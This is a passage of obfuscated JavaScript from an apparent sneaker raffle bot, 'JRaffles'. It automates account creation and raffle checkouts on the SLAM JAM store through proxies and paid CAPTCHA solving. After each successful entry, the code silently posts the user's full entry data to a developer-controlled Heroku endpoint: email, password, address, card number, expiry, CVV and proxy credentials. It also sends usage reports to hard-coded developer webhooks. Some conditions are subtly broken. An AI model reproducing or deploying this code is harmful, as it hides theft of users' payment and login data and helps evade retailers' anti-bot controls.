                            await _0x4aaa24(0xbb8), await _0x4bc542['$$eval']('.raffle__checkbox-label', _0x35b50c => _0x35b50c['forEach'](_0x4ad4fe => _0x4ad4fe['click']())), await _0x4aaa24(0x7d0), console['log'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x4bc542['click']('#raffle__form-submit'), await _0x4aaa24(0x1388);
                            try {
                                await _0x4bc542['waitForSelector']('#raffle__confirmation-message-container'), _0x2ad909 = 'no', _0x3265a5(_0x2aeadd[_0x12525c], _0x13ad37), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x36a246 = _0x2aeadd[_0x12525c];
                                try {
                                    prxdata = {
                                        'username': _0x1b66d2['replace']('#', ''),
                                        'module': _0x13ad37['name'],
                                        'entrydata': JSON['stringify'](_0x36a246),
                                        'proxy': '' + _0x3837c6[_0x12525c]
                                    };
                                    var _0xcedaac = JSON['stringify'](prxdata);
                                    let _0x518198 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0xcedaac, _0x518198);
                                } catch (_0x2e0561) {
                                }
                            } catch (_0x58fd2c) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x58fd2c));
                            }
                        } catch (_0x1502ce) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20' + _0x1502ce)), _0x2ad909 = 'yes';
                        } finally {
                            _0xd9fcf4 && _0xd9fcf4['close']();
                            if (_0x2ad909 == 'yes' && _0x3443b9 != 0x5 && _0x358098 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x13ad37['name'] + ']\x20Task\x20' + (_0x12525c + 0x1) + '\x20:\x20Retrying\x20(' + _0x3443b9 + '\x20/\x205)')), _0x12525c = _0x12525c - 0x1, _0x3443b9 = _0x3443b9 + 0x1;
                                continue;
                            }
                            _0x2ad909 == 'yes' && _0x3443b9 >= 0x5 && (_0x5d0cd0(_0x2aeadd[_0x12525c], _0x13ad37), _0x2ad909 = 'no', _0x3443b9 = 0x0), console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5c9b47, _0x430397, _0x5c6c92) {
                    _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x343742['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x51e9a6 = 0x0; _0x51e9a6 < _0x430397['length']; _0x51e9a6++) {
                        if (_0x44d541 != 'yes')
                            var _0x44d541 = '', _0x1df787 = 0x0;
                        var _0x39873d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1b66d2
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x343742['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3c97e2
                                }
                            ]
                        }];
                        const _0x58544c = { 'embeds': _0x39873d };
                        _0x5c2a2f(_0x5c9b47['name'] + '\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20/\x20' + _0x430397['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                        try {
                            await _0x10409e(_0x430397, _0x51e9a6);
                        } catch {
                            _0x44d541 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x325e70 = await _0xe75614(_0x430397[_0x51e9a6], _0x5c9b47, 'acc', ![]);
                        const _0x6d2450 = { 'succesDEVMSG': { 'embeds': [_0x325e70] } };
                        if (_0x430397[_0x51e9a6]['Email'] == '' || _0x430397[_0x51e9a6]['FirstName'] == '' || _0x430397[_0x51e9a6]['LastName'] == '') {
                            console['log'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4aaa24(0x7d0);
                            continue;
                        }
                        (_0x430397[_0x51e9a6]['Password'] == '' || _0x430397[_0x51e9a6] == undefined) && _0x430397[_0x51e9a6]['Password'] == 'JRaffles23!';
                        if (_0x343742['useRandomProxy'] = ![])
                            var _0x186ef7 = _0x5c6c92[_0x51e9a6]['split'](':');
                        else
                            var _0x542512 = Math['round'](Math['random']() * (_0x5c6c92['length'] - 0x1)), _0x186ef7 = _0x5c6c92[_0x542512]['split'](':');
                        var _0x192ef7;
                        try {
                            _0x192ef7 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x186ef7[0x0] + ':' + _0x186ef7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x192ef7 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x186ef7[0x0] + ':' + _0x186ef7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x10b435 = await _0x192ef7['newPage']();
                            await _0x10b435['authenticate']({
                                'username': '' + _0x186ef7[0x2],
                                'password': '' + _0x186ef7[0x3]
                            }), console['log'](_0x15e32e() + '\x20[' + _0x5c9b47['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x10b435['setRequestInterception'](!![]), _0x10b435['on']('request', _0x5d0677 => {
                                _0x5d0677['resourceType']() === 'image' || _0x5d0677['resourceType']() === 'font' || _0x5d0677['resourceType']() === 'media' ? _0x5d0677['abort']() : _0x5d0677['continue']();
                            }), await _0x10b435['goto']('https://drop.slamjam.com/account/register'), await _0x4aaa24(0xbb8), await _0x10b435['waitForSelector']('#FirstName'), await _0x10b435['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x10b435['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x15e32e() + '\x20[' + _0x5c9b47['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Filling\x20information'), await _0x4aaa24(0x4b0), await _0x10b435['type']('#FirstName', '' + _0x430397[_0x51e9a6]['FirstName']), await _0x4aaa24(0x226), await _0x10b435['type']('#LastName', '' + _0x430397[_0x51e9a6]['LastName']), await _0x4aaa24(0x226), await _0x10b435['type']('#Email', '' + _0x430397[_0x51e9a6]['Email']), await _0x4aaa24(0x2ee), await _0x10b435['type']('#ConfirmEmail', '' + _0x430397[_0x51e9a6]['Email']), await _0x4aaa24(0x2ee), await _0x10b435['type']('#CreatePassword', '' + _0x430397[_0x51e9a6]['Password']), await _0x4aaa24(0x2ee), await _0x10b435['type']('#CreateConfirmPassword', '' + _0x430397[_0x51e9a6]['Password']), await _0x4aaa24(0x226), console['log'](_0x15e32e() + '\x20[' + _0x5c9b47['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Submitting..'), await _0x10b435['$eval']('#create_customer', _0x5ca4e5 => _0x5ca4e5['submit']()), await _0x4aaa24(0x1388), console['log'](_0x15e32e() + '\x20[' + _0x5c9b47['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20' + _0x3f1ec6['cyan']('Solving\x20Captcha')), await _0x10b435['solveRecaptchas'](), console['log'](_0x15e32e() + '\x20[' + _0x5c9b47['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x10b435['$eval']('.shopify-challenge__container\x20>\x20form', _0x3efdaf => _0x3efdaf['submit']());
                            try {
                                await _0x10b435['waitForSelector']('.product-card__image'), await _0x4aaa24(0x1f4), _0x44d541 = 'no', console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x5c9b47['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Account\x20' + _0x430397[_0x51e9a6]['Email'] + '\x20Generated!')), _0x343ecd['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x430397[_0x51e9a6]['Email'] + ',' + _0x430397[_0x51e9a6]['Password']), console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x5c9b47['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Account\x20' + _0x430397[_0x51e9a6]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x6d2450['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3c4b04(_0x435bee, _0x6d2450['succesDEVMSG']);
                            } catch (_0x4fcd2d) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4fcd2d));
                            }
                        } catch (_0x153355) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20' + _0x153355));
                        } finally {
                            _0x192ef7 && _0x192ef7['close']();
                            if (_0x44d541 == 'yes' && _0x1df787 != 0x5) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x5c9b47['name'] + ']\x20Task\x20' + (_0x51e9a6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1df787 + '\x20/\x205)')), _0x51e9a6 = _0x51e9a6 - 0x1, _0x1df787 = _0x1df787 + 0x1;
                                continue;
                            }
                            _0x44d541 == 'yes' && _0x1df787 >= 0x5 && (_0x5d0cd0(_0x430397[_0x51e9a6], _0x5c9b47), _0x44d541 = 'no', _0x1df787 = 0x0), console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x27554a, _0x55ce1d, _0xa28f52) {
                    _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x343742['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3c85f0 = 0x0; _0x3c85f0 < _0x55ce1d['length']; _0x3c85f0++) {
                        var _0x34f1f6;
                        if (_0x121abc != 'yes')
                            var _0x121abc = '', _0x9b7a24 = 0x0;
                        _0x5c2a2f(_0x27554a['name'] + '\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20/\x20' + _0x55ce1d['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                        try {
                            await _0x10409e(_0x55ce1d, _0x3c85f0);
                        } catch {
                            _0x121abc = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x55ce1d[_0x3c85f0]['Email'] == '' || _0x55ce1d[_0x3c85f0]['Password'] == '' || _0x55ce1d[_0x3c85f0]['FirstName'] == '' || _0x55ce1d[_0x3c85f0]['LastName'] == '') {
                            console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x343742['useRandomProxy'] = ![])
                            var _0x3befc = _0xa28f52[_0x3c85f0]['split'](':');
                        else
                            var _0x5e1f4b = Math['round'](Math['random']() * (_0xa28f52['length'] - 0x1)), _0x3befc = _0xa28f52[_0x5e1f4b]['split'](':');
                        var _0xc3a773;
                        try {
                            _0xc3a773 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3befc[0x0] + ':' + _0x3befc[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xc3a773 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3befc[0x0] + ':' + _0x3befc[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5d8f5d = await _0xc3a773['newPage']();
                            await _0x5d8f5d['authenticate']({
                                'username': '' + _0x3befc[0x2],
                                'password': '' + _0x3befc[0x3]
                            }), await _0x5d8f5d['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5d8f5d['setRequestInterception'](!![]), _0x5d8f5d['on']('request', _0x2ca916 => {
                                _0x2ca916['resourceType']() === 'image' || _0x2ca916['resourceType']() === 'font' || _0x2ca916['resourceType']() === 'media' ? _0x2ca916['abort']() : _0x2ca916['continue']();
                            }), await _0x5d8f5d['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5d8f5d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5d8f5d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4aaa24(0x258), await _0x5d8f5d['waitForSelector']('#CustomerEmail'), console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5d8f5d['type']('#CustomerEmail', '' + _0x55ce1d[_0x3c85f0]['Email']), await _0x4aaa24(0x12c), await _0x5d8f5d['type']('#CustomerPassword', '' + _0x55ce1d[_0x3c85f0]['Password']), await _0x4aaa24(0x226), await _0x5d8f5d['$eval']('#customer_login', _0xdcd99e => _0xdcd99e['submit']()), await _0x4aaa24(0x7d0), await _0x5d8f5d['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20' + _0x3f1ec6['cyan']('Solving\x20Captcha')), await _0x5d8f5d['solveRecaptchas'](), console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x5d8f5d['$eval']('.shopify-challenge__container\x20>\x20form', _0x5c201b => _0x5c201b['submit']());
                            try {
                                await _0x5d8f5d['waitForSelector']('.nav-account'), await _0x4aaa24(0x4b0);
                            } catch {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x5d8f5d['goto']('' + _0x55ce1d[_0x3c85f0]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4aaa24(0xbb8), console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x5d8f5d['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x5d8f5d['click']('.product-select-variant-wrapper'), await _0x4aaa24(0x320), await _0x5d8f5d['click']('li.product-select-variant__value[data-size=\x22' + _0x55ce1d[_0x3c85f0]['Size'] + '\x22]'), await _0x4aaa24(0x384), await _0x5d8f5d['$eval']('#AddToCartForm-product-template-raffle', _0x49b22f => _0x49b22f['submit']()), await _0x5d8f5d['waitForSelector']('.cart-order-summary__content'), await _0x4aaa24(0x514), await _0x5d8f5d['goto']('https://drop.slamjam.com/checkout'), await _0x4aaa24(0x514), await _0x5d8f5d['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5d8f5d['select']('#checkout_shipping_address_country', '' + _0x55ce1d[_0x3c85f0]['Country']), await _0x4aaa24(0x200), await _0x5d8f5d['waitForSelector']('#checkout_shipping_address_first_name'), await _0x5d8f5d['type']('#checkout_shipping_address_first_name', '' + _0x55ce1d[_0x3c85f0]['FirstName']), await _0x4aaa24(0x237), await _0x5d8f5d['type']('#checkout_shipping_address_last_name', '' + _0x55ce1d[_0x3c85f0]['LastName']), await _0x4aaa24(0x1e0), await _0x5d8f5d['type']('#checkout_shipping_address_address1', _0x55ce1d[_0x3c85f0]['Address1'] + '\x20' + _0x55ce1d[_0x3c85f0]['HouseNumber']), await _0x4aaa24(0x514), await _0x5d8f5d['type']('#checkout_shipping_address_address2', '' + _0x55ce1d[_0x3c85f0]['Address2']), await _0x4aaa24(0x514);
                            _0x55ce1d[_0x3c85f0]['Postcode'] == undefined && (_0x55ce1d[_0x3c85f0]['Postcode'] = _0x55ce1d[_0x3c85f0]['Zip']);
                            await _0x5d8f5d['type']('#checkout_shipping_address_zip', '' + _0x55ce1d[_0x3c85f0]['Postcode']), await _0x4aaa24(0x2bc), await _0x5d8f5d['type']('#checkout_shipping_address_city', '' + _0x55ce1d[_0x3c85f0]['City']), await _0x4aaa24(0x320), await _0x5d8f5d['type']('#checkout_shipping_address_phone', '' + _0x55ce1d[_0x3c85f0]['Phone']), await _0x4aaa24(0x320), await _0x5d8f5d['click']('#continue_button'), await _0x4aaa24(0xbb8), await _0x5d8f5d['waitForSelector']('.summary-title'), await _0x4aaa24(0x320), await _0x5d8f5d['click']('#continue_button'), await _0x4aaa24(0x320), console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x5d8f5d['waitForSelector']('#checkout_credit_card_vault'), await _0x4aaa24(0x3e8);
                            var _0x7d641e = await _0x5d8f5d['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x598214 = await _0x7d641e['contentFrame']();
                            await _0x598214['click']('#number'), await _0x4aaa24(0x3e8), await _0x598214['type']('#number', '' + _0x55ce1d[_0x3c85f0]['CardNumber'], { 'delay': 0x78 }), _0x7d641e = await _0x5d8f5d['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x598214 = await _0x7d641e['contentFrame'](), await _0x4aaa24(0x1c2), await _0x598214['click']('#name'), await _0x4aaa24(0x1f4), await _0x598214['type']('#name', '' + _0x55ce1d[_0x3c85f0]['NameOnCard'], { 'delay': 0x78 }), _0x7d641e = await _0x5d8f5d['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x598214 = await _0x7d641e['contentFrame'](), await _0x4aaa24(0x1c2), await _0x598214['click']('#expiry'), await _0x4aaa24(0x1f4), await _0x598214['type']('#expiry', '' + _0x55ce1d[_0x3c85f0]['ExpiryDate'], { 'delay': 0x78 }), _0x7d641e = await _0x5d8f5d['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x598214 = await _0x7d641e['contentFrame'](), await _0x4aaa24(0x1c2), await _0x598214['click']('#verification_value'), await _0x4aaa24(0x1f4), await _0x598214['type']('#verification_value', '' + _0x55ce1d[_0x3c85f0]['CVV'], { 'delay': 0x78 }), await _0x5d8f5d['$eval']('#accepts-flag-raffle', _0x2f922c => _0x2f922c['click']()), await _0x4aaa24(0x7d0), console['log'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x5d8f5d['$eval']('#continue_button', _0x2ebc61 => _0x2ebc61['click']()), await _0x4aaa24(0x1b58), await _0x5d8f5d['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x5d8f5d['$eval']('.edit_checkout.animate-floating-labels', _0x150c45 => _0x150c45['submit']()), await _0x4aaa24(0x7d0);
                            try {
                                await _0x5d8f5d['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x121abc = 'no', _0x3265a5(_0x55ce1d[_0x3c85f0], _0x27554a), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0xb9a4b5) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0xb9a4b5['message']);
                            }
                            var _0x3bed18 = await _0xe75614(_0x55ce1d[_0x3c85f0], _0x27554a, 'dev', ![]), _0x2cba87 = await _0xe75614(_0x55ce1d[_0x3c85f0], _0x27554a, 'pub', ![]);
                            let _0x1d45e5 = _0x55ce1d[_0x3c85f0];
                            try {
                                prxdata = {
                                    'username': _0x1b66d2['replace']('#', ''),
                                    'module': _0x27554a['name'],
                                    'entrydata': JSON['stringify'](_0x1d45e5),
                                    'proxy': '' + _0xa28f52[_0x3c85f0]
                                };
                                var _0x1b9f9d = JSON['stringify'](prxdata);
                                let _0x554273 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x1b9f9d, _0x554273);
                            } catch (_0x9903fa) {
                            }
                            const _0x4c5029 = {
                                'succesDEVMSG': { 'embeds': [_0x3bed18] },
                                'succesPUBMSG': { 'embeds': [_0x2cba87] }
                            };
                            try {
                                _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x4c5029['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x4c5029['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x510dd4, _0x4c5029['succesPUBMSG']);
                            } catch (_0x253fac) {
                                console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x253fac));
                            }
                        } catch (_0x1471da) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20' + _0x1471da)), _0x34f1f6 = '' + _0x1471da;
                            var _0x445685 = await _0xe75614(kickz[_0x3c85f0], _0x27554a, 'dev', !![], _0x34f1f6);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x445685] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], EMBEDS['errorDEV']), await _0x3c4b04(_0x1dfefb, EMBEDS['errorDEV']), _0x121abc = 'yes';
                        } finally {
                            _0xc3a773 && _0xc3a773['close']();
                            if (_0x121abc == 'yes' && _0x9b7a24 != 0x5 && _0x34f1f6 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x27554a['name'] + ']\x20Task\x20' + (_0x3c85f0 + 0x1) + '\x20:\x20Retrying\x20(' + _0x9b7a24 + '\x20/\x205)')), _0x3c85f0 = _0x3c85f0 - 0x1, _0x9b7a24 = _0x9b7a24 + 0x1;
                                continue;
                            }
                            _0x121abc == 'yes' && _0x9b7a24 >= 0x5 && (_0x5d0cd0(_0x55ce1d[_0x3c85f0], _0x27554a), _0x121abc = 'no', _0x9b7a24 = 0x0), console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x54aeef) {
                    var _0x27dc94 = await _0x325811(), _0x175c92 = _0x343ecd['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x517ed8 = _0x54b359['parse'](_0x175c92, { 'header': !![] })['data'];
                    for (var _0x579087 = 0x0; _0x579087 < _0x517ed8['length']; _0x579087++) {
                        var _0x3e523a = _0x517ed8[_0x579087]['Store'], _0x2197f4 = _0x517ed8[_0x579087]['Mode'];
                        for (var _0x29070b of _0x34ba82) {
                            const _0x1ae491 = _0x29070b['name']['includes'](_0x3e523a);
                            if (!_0x1ae491)
                                continue;
                            for (mode of _0x29070b['modules']) {
                                if (mode['name'] == _0x2197f4) {
                                    console['log']('Running\x20' + _0x3f1ec6['cyan'](mode['name'])), await mode['function'](mode, [_0x517ed8[_0x579087]], _0x27dc94);
                                    var _0x2ac6e0 = _0x175c92['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x343ecd['writeFileSync']('../failed-tasks.csv', _0x2ac6e0);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x5b60c2 = await _0x1c1d23['get']('Answer');
                    if (_0x5b60c2['Answer']['toLowerCase']() == 'y') {
                        _0x343ecd['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x4aaa24(0x3e8);
                        return;
                    }
                    if (_0x5b60c2['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x4aaa24(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x4aaa24(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x3f2f8a(_0x584afe) {
    var _0x2db34 = await _0x325811(), _0x125a85 = _0x343ecd['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x2900c6 = _0x54b359['parse'](_0x125a85, { 'header': !![] })['data'];
    for (var _0x3a2489 = 0x0; _0x3a2489 < _0x2900c6['length']; _0x3a2489++) {
        var _0x5da706 = _0x2900c6[_0x3a2489]['Store'], _0x2d9163 = _0x2900c6[_0x3a2489]['Mode'];
        for (var _0x2ddb9f of _0x34ba82) {
            const _0x3bf6ff = _0x2ddb9f['name']['includes'](_0x5da706);
            if (_0x3bf6ff)
                for (mode of _0x34ba82[_0x2ddb9f]['modules']) {
                    const _0x4f8987 = mode['name']['includes'](_0x2d9163);
                    _0x4f8987 && (_0x584afe = mode['name'], await mode['function'](_0x584afe, _0x2900c6[_0x3a2489], _0x2db34));
                }
        }
    }
}
async function _0x1c8cd7() {
    await _0x4207b6(), console['clear']();
    _0x343742['threads'] > 0x5 && (_0x343742['threads'] = 0x5);
    if (_0x3c97e2 != 'devkey') {
        let _0x2ce5a7 = await _0x5694b5['autoUpdate']();
        if (_0x2ce5a7 === 'yes')
            return _0x593051('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x3ba935 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x4aaa24(0x2710);
        ;
    }
    await _0x5a0ab6(_0x3ba935);
    if (_0x809b0c === ![])
        return console['log']('Closing\x20Browser'), await _0x4aaa24(0xbb8);
    else
        try {
            var _0x2ed4ac = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x1b66d2
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x3c97e2
                    }
                ]
            }];
            const _0xb8384a = { 'embeds': _0x2ed4ac };
            var _0x24627f = await _0xe75614(null, null, 'open', ![]);
            const _0x5a10d8 = { 'openDEVMSG': { 'embeds': [_0x24627f] } };
